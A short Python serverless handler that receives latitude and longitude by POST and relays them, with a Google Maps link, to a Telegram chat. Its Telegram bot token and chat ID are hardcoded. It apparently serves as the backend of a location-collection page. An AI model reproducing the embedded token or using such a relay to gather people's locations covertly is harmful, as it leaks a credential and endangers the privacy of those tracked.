import requests
import json

TELEGRAM_BOT_TOKEN = '7715557687:AAHvJdcOYIqjIpGpBSsv66Irb9ViN5tZvMs'
TELEGRAM_CHAT_ID = '2063662084'

def handler(request):
    if request.method == "POST":
        try:
            data = request.json
            latitude = data.get('latitude')
            longitude = data.get('longitude')

            message = f"Nova localização recebida:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://maps.google.com/?q={latitude},{longitude}"

            requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message
            })

            return {
                "statusCode": 200,
                "body": json.dumps({"status": "ok"})
            }

        except Exception as e:
            return {
                "statusCode": 500,
                "body": json.dumps({"error": str(e)})
            }

    return {
        "statusCode": 405,
        "body": json.dumps({"error": "Method Not Allowed"})
    }
